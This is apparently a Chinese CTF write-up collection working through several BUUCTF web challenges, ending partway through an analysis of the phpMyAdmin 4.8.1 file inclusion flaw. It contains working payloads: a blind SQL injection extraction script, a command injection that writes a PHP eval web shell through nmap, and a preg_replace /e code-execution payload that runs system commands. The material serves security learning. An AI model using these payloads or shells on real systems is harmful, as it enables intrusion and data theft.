<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/fllllllllllllag))</span><br></pre></td></tr></table></figure>

**/fllllllllllllag**通过md5[加密](https://so.csdn.net/so/search?q=加密&spm=1001.2101.3001.7020)后：3bf9f6cf685a6dd8defadabfb41a03a1

md5(cookie_secret+md5(/fllllllllllllag))通过md5加密后的结果:

73d39a8638f8b59eaaa8563107280267

此时构造payload:

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=73d39a8638f8b59eaaa8563107280267</span><br></pre></td></tr></table></figure>

得到flag

## [HCTF 2018]admin

https://www.jianshu.com/p/f92311564ad0

##  [CISCN2019 华北赛区 Day2 Web1]Hack World

![image-20220506215158582](./buu/image-20220506215158582.png)

首页提示flag位于flag表的flag字段

直接输入

<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">select</span> flag <span class="keyword">from</span> flag;</span><br></pre></td></tr></table></figure>

显示sql注入检测

单独输入select关键字没有被过滤，说明过滤了空格

 使用语句

<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flag);</span><br></pre></td></tr></table></figure>

因为题目提示flag为uuid，uuid是32位随机字符串，所以需要编写python脚本来获取flag

 先写出一个核心的语句，判断flag的第一个字符是否ascii码为101

`if((ascii(substr((select(flag)from(flag)),1,1))=101),0,1)`
输出Hello，表示这个地方返回的1，说明第一个字符ascii码为101 

![image-20220506215334419](./buu/image-20220506215334419.png)

`if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1)`

Error表示此处返回0，第一个字符ascii码不为102

`payload：id=1^(length(select(flag)from(flag))>10)`来判断flag长度为42位，这里可以用括号替代空格，也可以同[tab]及其他未过滤的空白符替代空格。然后利用strsub()函数逐位爆出flag，脚本如下：

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&#x27;http://fc3de8f9-bb06-4116-adc8-5455bb0a809f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">43</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        s = (<span class="built_in">int</span>)((<span class="built_in">max</span>+<span class="built_in">min</span>)/<span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">&#x27;1^(ascii(substr((select(flag)from(flag)),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;,1))&gt;&#x27;</span>+<span class="built_in">str</span>(s)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        r = requests.post(url,data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(r.content):</span><br><span class="line">            <span class="built_in">max</span>=s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span>=s</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">max</span>-<span class="built_in">min</span>)&lt;=<span class="number">1</span>):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">max</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

## [RoarCTF 2019]Easy Java

知识点

- web.xml泄露
- filter伪协议读取

![image-20220506220827618](./buu/image-20220506220827618.png)

点击help：`java.io.FileNotFoundException:&#123;help.docx&#125;`

发现filename=help.docx有可能可以进行文件读取，尝试php://filter/read=convert.base64-encode/resource=help.docx无果，查看wp，知道可以尝试将请求方式由GET换为POST，POST后，得到help.docx，如图所示
![image-20220506220941503](./buu/image-20220506220941503.png)

![image-20220506221814199](./buu/image-20220506221814199.png)

下载了help.docx

![image-20220506221851584](./buu/image-20220506221851584.png)

题目提示JavaWeb，所以尝试读取WEB-INF/web.xml，javaweb程序的配置文件，javaweb所有的文件一般都放在WEB-INF里面。

![image-20220506222045013](./buu/image-20220506222045013.png)

我们直接访问Flag目录，出现500错误：

由于javaweb的代码文件放在WEB-INF/classes下面，所以：
我们要以POST方式访问filename=WEB-INF/classes/com/wm/ctf/FlagController.class

![image-20220506222353022](./buu/image-20220506222353022.png)

解码即可

WEB-INF主要包含以下文件或目录: /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，通过反编译class文件，得到网站源码

## [BUUCTF 2018]Online Tool

![image-20220507213348076](./buu/image-20220507213348076.png)

很简洁的一个rce 不难看出是让我们传一个参数名为host 值为一个ip的参数 然后对这个ip进行nmap扫描 我们传入的ip会先后经过escapeshellarg和escapeshellcmd的转义 这两个函数是解题点 下面贴上这俩函数的用法[escapeshellarg](https://www.php.net/manual/zh/function.escapeshellarg.php) [escapeshellcmd](https://www.php.net/manual/zh/function.escapeshellcmd.php)

首先是escapeshellarg 他的作用就是将单引号转义 并将转义后的单引号的前后两部分再用一个单引号括上 这边贴上一个例子

<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span>&#x27; ls ---&gt; &#x27;<span class="number">123</span>&#x27;\&#x27;&#x27; ls&#x27;</span><br><span class="line">注意引号和空格的位置 很关键</span><br></pre></td></tr></table></figure>

escapeshellcmd

<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在&amp;#;`|<span class="symbol">\?</span>~&lt;&gt;^()[]&#123;&#125;$, <span class="symbol">\x</span>0A 和 <span class="symbol">\x</span>FF和没有配对的单引号前插入&quot;<span class="symbol">\&quot;</span> 注意注意注意注意 没有配对的单引号</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;123&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="built_in">ls</span><span class="string">&#x27; ---&gt; &#x27;</span><span class="number">123</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27; ls\&#x27;</span></span><br></pre></td></tr></table></figure>

在上面的那行代码里 只有最后的那一个单引号是没有配对的 中间的那俩并在一起的其实是配对了

nmap的-oG命令可以写入文件 而可能有一个会让人疑惑的点 我用-oG写一个马 但是马里面的所有字符都被转义了 那马还能用吗 答案是可以的 转义只是让这个字符串不能参与命令的执行 但是写在文件里面他还是一个马

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">123&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27; </span></span><br><span class="line"><span class="xml">---&gt; &#x27;123&#x27;\&#x27;&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;\&#x27;&#x27;&#x27;(每转义一个单引号 单引号前后部分都用单引号括起来</span></span><br><span class="line"><span class="xml">&#x27;123&#x27;\&#x27;&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;\&#x27;&#x27;&#x27; ---&gt; &#x27;123&#x27;\\&#x27;&#x27; </span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;\\&#x27;&#x27;&#x27;(偶数单引号 两两配对</span></span><br></pre></td></tr></table></figure>

如果最后没加引号这个就不用解释了 如果没加引号 最后会变成这样

<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;<span class="symbol">\\</span>&#x27;&#x27; <span class="symbol">\&lt;</span><span class="symbol">\?</span>php phpinfo<span class="symbol">\(</span><span class="symbol">\)</span><span class="symbol">\;</span><span class="symbol">\?</span><span class="symbol">\&gt;</span> -oG hack.php<span class="symbol">\&#x27;</span></span><br></pre></td></tr></table></figure>

有一部分人肯定在最后加了引号没加空格 如果没加空格会怎么样

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;123&#x27;</span>\\<span class="string">&#x27;&#x27;</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span> -oG hack.php<span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

'\'这个字符很关键 在你将传的字符串写成一个文件的时候 他代表这在.php后面会跟着一个\ 变成.php\ 这很明显也是我们不想要的 没错了就可以包含了 文件地址就在sandbox里 菜刀拿到flag

payload理解：payload:`?host=' <?php eval($_POST["v"]);?> -oG shell.php '`

两边加单引号是因为，不加的话，两个函数执行后会变成：

    '<?php eval($_POST["v"]);?> -oG shell.php'

就不是一条命令了，而是一串字符串而已，因为在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。
引号旁边加空格是因为，如果不加，当两个函数执行并echo出来后就会变成：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;v&quot;</span>]);<span class="meta">?&gt;</span> -oG shell.php\\</span><br></pre></td></tr></table></figure>

文件名是`shell.php\\`，而不是`shell.php`

参数V不能用单引号，而是用双引号:

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">escapeshellarg()转单引号后，紧接着escapeshellcmd()又会对敏感字符\转义，就是比如拿这道题来说：</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">传这个进去：&#x27; </span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG shell.php &#x27;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">escapeshellarg()后：&#x27;&#x27;\&#x27;&#x27;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;\&#x27;&#x27;</span>v<span class="string">&#x27;\&#x27;&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml"> -oG shell.php &#x27;\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">escapeshellcmd()后：&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[&#x27;\\&#x27;&#x27;v&#x27;\\&#x27;&#x27;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">echo出来，这里看单引号闭合，从一个单引号数下去，和离他最近的引号闭合，\\转义成\类推，如果是&#x27;\\&#x27;是没有转义的，直接就是\\所以就是：</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">\</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[\\v\]);<span class="meta">?&gt;</span></span><span class="xml"> -oG shell.php \\</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

可以直接用反引号执行的：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG shell12.php &#x27;</span></span><br></pre></td></tr></table></figure>

## [BJDCTF2020]ZJCTF，不过如此

![image-20220508200559939](./buu/image-20220508200559939.png)

得到next.php的文件内容：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="comment">//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作表达式执行;</span></span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

很明显要我们绕过那个正则匹配，然后执行eval()函数
而我们要执行eval()函数，就是要通过getFlag()这个函数，而怎么取调用呢？
 把那个正则匹配表达式往上面一搜
[先知社区](https://xz.aliyun.com/t/2557)

对 `$_GET as $re => $str` 的理解：

这是一个动态赋值的过程，即会将get请求中的参数名作为键$re，参数对应的值作为键值$str

[加深理解题目](https://www.cnblogs.com/Sentry-fei/p/15476811.html)

正则表达式的\S：匹配所有非空白字符； .号：匹配除\n外的任意字符；
 *号：匹配前面的字符0次或者多次
 +号：匹配前面的字符1次或者多次（如果要在url里输入+号，必须要对其进行编码，+号编码为:%2b）

http://www.phpheidong.com/blog/article/293254/d7d2befb3f3d45314199/

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="regexp">//</span>ed976cac-<span class="number">0</span>fac-<span class="number">469</span>c-<span class="number">9</span>a5b-<span class="number">3</span>d124ca13654.node4.buuoj.cn:<span class="number">81</span><span class="regexp">/next.php?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(%27cat%20/</span>flag%<span class="number">27</span>);</span><br><span class="line">或者:</span><br><span class="line">http:<span class="regexp">//</span>ed976cac-<span class="number">0</span>fac-<span class="number">469</span>c-<span class="number">9</span>a5b-<span class="number">3</span>d124ca13654.node4.buuoj.cn:<span class="number">81</span><span class="regexp">/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/</span>flag%<span class="number">27</span>);</span><br><span class="line"></span><br><span class="line">因为是在双引号中解析函数，所以用到 <span class="variable">$&#123;函数&#125;</span> 或者 &#123;<span class="variable">$&#123;函数&#125;</span>&#125;</span><br><span class="line">在<span class="variable">$&#123;&#125;</span>中可以调用函数</span><br></pre></td></tr></table></figure>

$与$&#123; &#125;都是用来引用变量的，只不过$&#123; &#125;可以指定变量边界，也可用于对[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)变量进行截取等处理，具体用法可参考如下blog
 **[linux之$&#123;&#125;符号详解](https://blog.csdn.net/qq_43382735/article/details/121606145)**

**\1** 在正则表达式中有自己的含义，**\1** 实际上指定的是第一个子匹配项，也就是他自己

preg_replace()第一个参数是匹配的模式，第二个是要替换成的字符，第三个是被替换的字符串

所以就是\S*，匹配$&#123;getFlag()&#125;所有字符，替换成他自己，然后代码执行，调用getFlag函数

## [GWCTF 2019]我有一个数据库

扫描目录发现：

![image-20220509131318840](./buu/image-20220509131318840.png)

robots.txt打开是phpinfo.php

![image-20220509133048407](./buu/image-20220509133048407.png)

以及上面的，打开phpmyadmin得到：

![image-20220509133143430](./buu/image-20220509133143430.png)

由于phpmyadmin是4.8.1版本，有一个CVE漏洞

**漏洞原理**

官网下载的最新版，文件名是[phpMyAdmin-4.8.1-all-languages.zip](https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip)

首先在index.php 50-63行代码

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

满足5个条件后就会include$_REQUEST['target']的内容

    $_REQUEST['target']不为空
    $_REQUEST['target']是字符串
    $_REQUEST['target']不以index开头
    $_REQUEST['target']不在$target_blacklist中
    ‘import.php’, ‘export.php’
    Core::checkPageValidity($_REQUEST['target'])为真
    代码在libraries\classes\Core.php 443-476行
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

**$whitelist**一开始未传参过来，所以会被赋值为**self::$goto_whitelist**

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span 